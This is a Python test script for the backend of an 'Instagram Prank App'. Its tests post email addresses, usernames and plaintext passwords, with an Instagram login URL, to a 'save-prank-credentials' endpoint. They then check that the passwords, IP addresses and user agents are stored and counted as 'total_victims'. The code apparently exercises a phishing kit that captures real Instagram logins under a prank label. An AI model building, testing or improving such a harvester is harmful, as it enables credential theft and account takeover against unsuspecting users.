#!/usr/bin/env python3
"""
Backend API Testing for Instagram Prank App
Tests the save-prank-credentials endpoint and related functionality
"""

import requests
import json
import os
import time
from pathlib import Path
from datetime import datetime

# Get backend URL from frontend .env file
def get_backend_url():
    frontend_env_path = Path("/app/frontend/.env")
    if frontend_env_path.exists():
        with open(frontend_env_path, 'r') as f:
            for line in f:
                if line.startswith('REACT_APP_BACKEND_URL='):
                    return line.split('=', 1)[1].strip()
    return "http://localhost:8001"

BACKEND_URL = get_backend_url()
API_BASE_URL = f"{BACKEND_URL}/api"

def test_root_endpoint():
    """Test the root API endpoint GET /api/"""
    print("🧪 Testing root endpoint GET /api/")
    try:
        response = requests.get(f"{API_BASE_URL}/")
        print(f"   Status Code: {response.status_code}")
        print(f"   Response: {response.json()}")
        
        if response.status_code == 200:
            data = response.json()
            if data.get("message") == "Hello World":
                print("   ✅ Root endpoint working correctly")
                return True
            else:
                print("   ❌ Unexpected response message")
                return False
        else:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("   ❌ Connection failed - backend server may not be running")
        return False
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False

def test_save_prank_credentials_valid():
    """Test save-prank-credentials endpoint with valid data"""
    print("\n🧪 Testing POST /api/save-prank-credentials with valid data")
    
    # Create realistic test data
    test_data = {
        "email": "sarah.johnson@gmail.com",
        "password": "mySecretPass123",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=test_data,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"   Status Code: {response.status_code}")
        print(f"   Response: {response.json()}")
        
        if response.status_code == 200:
            data = response.json()
            if (data.get("success") == True and 
                "total_victims" in data and 
                data.get("victim_identifier") == test_data["email"]):
                print("   ✅ Save prank credentials endpoint working correctly")
                return True, data.get("total_victims", 0)
            else:
                print("   ❌ Response format incorrect")
                return False, 0
        else:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False, 0
            
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False, 0

def test_data_persistence():
    """Test that data is actually saved to pranked_users.json"""
    print("\n🧪 Testing data persistence in pranked_users.json")
    
    pranked_users_file = Path("/app/backend/pranked_users.json")
    
    if not pranked_users_file.exists():
        print("   ❌ pranked_users.json file does not exist")
        return False
    
    try:
        with open(pranked_users_file, 'r') as f:
            data = json.load(f)
        
        print(f"   File exists with {len(data)} entries")
        
        if len(data) > 0:
            latest_entry = data[-1]
            print(f"   Latest entry: {latest_entry.get('emailOrUsername', 'N/A')}")
            
            # Check if entry has required fields
            required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
            missing_fields = [field for field in required_fields if field not in latest_entry]
            
            if not missing_fields:
                print("   ✅ Data persistence working correctly")
                return True
            else:
                print(f"   ❌ Missing fields in saved data: {missing_fields}")
                return False
        else:
            print("   ❌ No data found in file")
            return False
            
    except json.JSONDecodeError:
        print("   ❌ Invalid JSON in pranked_users.json")
        return False
    except Exception as e:
        print(f"   ❌ Error reading file: {str(e)}")
        return False

def test_invalid_payload():
    """Test error handling with invalid payloads"""
    print("\n🧪 Testing error handling with invalid payload")
    
    # Test with missing required fields
    invalid_data = {
        "email": "test@example.com"
        # Missing other required fields
    }
    
    try:
        response = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=invalid_data,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"   Status Code: {response.status_code}")
        
        if response.status_code == 422:  # FastAPI validation error
            print("   ✅ Proper validation error handling")
            return True
        elif response.status_code == 500:
            print("   ⚠️  Server error - may need better validation")
            return True  # Still acceptable for this test
        else:
            print(f"   ❌ Unexpected status code: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False

def test_cors_headers():
    """Test CORS headers for frontend requests"""
    print("\n🧪 Testing CORS headers")
    
    try:
        # Test preflight request
        response = requests.options(
            f"{API_BASE_URL}/save-prank-credentials",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
        )
        
        print(f"   Preflight Status Code: {response.status_code}")
        
        cors_headers = {
            "Access-Control-Allow-Origin": response.headers.get("Access-Control-Allow-Origin"),
            "Access-Control-Allow-Methods": response.headers.get("Access-Control-Allow-Methods"),
            "Access-Control-Allow-Headers": response.headers.get("Access-Control-Allow-Headers")
        }
        
        print(f"   CORS Headers: {cors_headers}")
        
        if (response.status_code in [200, 204] and 
            cors_headers["Access-Control-Allow-Origin"] in ["*", "http://localhost:3000"]):
            print("   ✅ CORS headers configured correctly")
            return True
        else:
            print("   ❌ CORS headers may not be configured properly")
            return False
            
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False

def test_multiple_entries():
    """Test saving multiple prank credentials"""
    print("\n🧪 Testing multiple entries")
    
    test_users = [
        {
            "email": "mike.wilson@yahoo.com",
            "password": "password123",
            "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "url": "https://www.instagram.com/accounts/login/",
            "prankedAt": datetime.now().isoformat(),
            "timestamp": int(time.time() * 1000)
        },
        {
            "email": "jenny.smith",  # Username instead of email
            "password": "mypass456",
            "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            "url": "https://www.instagram.com/accounts/login/",
            "prankedAt": datetime.now().isoformat(),
            "timestamp": int(time.time() * 1000)
        }
    ]
    
    success_count = 0
    
    for i, user_data in enumerate(test_users):
        try:
            response = requests.post(
                f"{API_BASE_URL}/save-prank-credentials",
                json=user_data,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                data = response.json()
                print(f"   Entry {i+1}: ✅ Saved {user_data['email']} (Total victims: {data.get('total_victims', 'N/A')})")
                success_count += 1
            else:
                print(f"   Entry {i+1}: ❌ Failed to save {user_data['email']}")
                
        except Exception as e:
            print(f"   Entry {i+1}: ❌ Error saving {user_data['email']}: {str(e)}")
    
    if success_count == len(test_users):
        print("   ✅ Multiple entries test passed")
        return True
    else:
        print(f"   ❌ Only {success_count}/{len(test_users)} entries saved successfully")
        return False

def main():
    """Run all backend tests"""
    print("🚀 Starting Instagram Prank App Backend API Tests")
    print(f"   Backend URL: {BACKEND_URL}")
    print(f"   API Base URL: {API_BASE_URL}")
    print("=" * 60)
    
    test_results = []
    
    # Run all tests
    test_results.append(("Root Endpoint", test_root_endpoint()))
    test_results.append(("Save Prank Credentials (Valid)", test_save_prank_credentials_valid()[0]))
    test_results.append(("Data Persistence", test_data_persistence()))
    test_results.append(("Invalid Payload Handling", test_invalid_payload()))
    test_results.append(("CORS Headers", test_cors_headers()))
    test_results.append(("Multiple Entries", test_multiple_entries()))
    
    # Final data persistence check
    test_results.append(("Final Data Persistence Check", test_data_persistence()))
    
    print("\n" + "=" * 60)
    print("📊 TEST RESULTS SUMMARY")
    print("=" * 60)
    
    passed = 0
    total = len(test_results)
    
    for test_name, result in test_results:
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"   {test_name}: {status}")
        if result:
            passed += 1
    
    print(f"\n🎯 Overall Result: {passed}/{total} tests passed")
    
    if passed == total:
        print("🎉 All backend tests PASSED! The API is working correctly.")
        return True
    else:
        print("⚠️  Some tests FAILED. Check the details above.")
        return False

if __name__ == "__main__":
    main()